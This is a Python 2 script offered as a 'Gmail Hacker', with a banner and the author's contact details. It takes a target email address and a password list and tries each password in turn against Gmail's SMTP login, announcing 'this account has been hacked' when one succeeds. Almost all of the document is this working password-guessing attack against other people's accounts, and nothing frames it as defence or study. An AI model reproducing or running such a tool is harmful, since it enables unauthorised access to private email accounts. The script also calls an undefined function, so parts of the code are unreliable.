#!/usr/bin/python
'''coded by MarShal RaFi'''

import smtplib
from os import system
W = '\033[1;37m' # White bold
N  = '\033[0m'  # white (Normal)
R = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
print ' Tawzihat:'
print '------------------------------'
print W+C+' Tawasot Gmail Hacker Shoma '
print W+C+' Metawanid Besyar Ba Zodi yak'
print W+C+' Yak Account Gmail Ra Hack'
print W+C+' konid Wa Ee Barnama Az Taraf '
print W+C+' MarShal RaFi Baray Shoma '
print W+C+' Hast Agar Khosh Tan Amad '
print W+C+' Share Konid...' 
print W+C+'______________________________'

print W+N+'**********                              ************     *******'
print W+N+'**********               **             ************     *******'
print W+P+'**    *****             ****            **                 ***'
print W+P+'**    *****            **  **           **                 ***'
print W+G+'**   *****            **    **          **                 ***'
print W+G+'**   ****            **      **         ************       ***'
print W+C+'**  ***             ************        ************       ***'
print W+C+'*******            **************       **                 ***'
print W+O+'**    **          **            **      **                 ***'
print W+O+'**     **        **              **     **                 ***'
print W+B+'**     ***      **                **    **                 ***'
print W+N+'**      ***    **                  **   **               *******'
print W+N+'**       ***  **                    **  **               *******' 
print W+G+'_____________________________________________________'
print W+C+'      AFGHAN DARK HACKER MARSHAL RAFI HERAWI      '
print W+G+'_____________________________________________________'
print W+O+'||||||||||||||||||||||||||||||||||||||||'
print W+O+' <<<GMAIL HACKER>>>                   ||'
print W+O+'CREATED BY RAFI TRICKER               ||'
print W+O+'[AFGHAN DARK HACKER MarShal RaFi]     ||'
print W+O+'Facebook : rafi.569                   ||'
print W+O+'Website : www.rafitricker.blogsky.com ||'
print W+O+'Phone Number : +93795679595           ||'
print W+O+'IMO : +93796706345                    ||'
print W+O+'||||||||||||||||||||||||||||||||||||||||'
 
print W+G+'[1] Starat The Crack Gmail'
print W+R+'[2] Exit\Khoruj'
option = input('Rafi==>')
print W+C+'Inja Mahale Password List Khod Ra Bezanid'
print W+R+'Exp-Messal:/sdcard/password.txt'
if option == 1:
   file_path = raw_input('enter the path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('enter the target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print W+R+'[+] this account has been hacked, password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print W+R+'[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print W+O+'[!] password not found => ' + password
login()
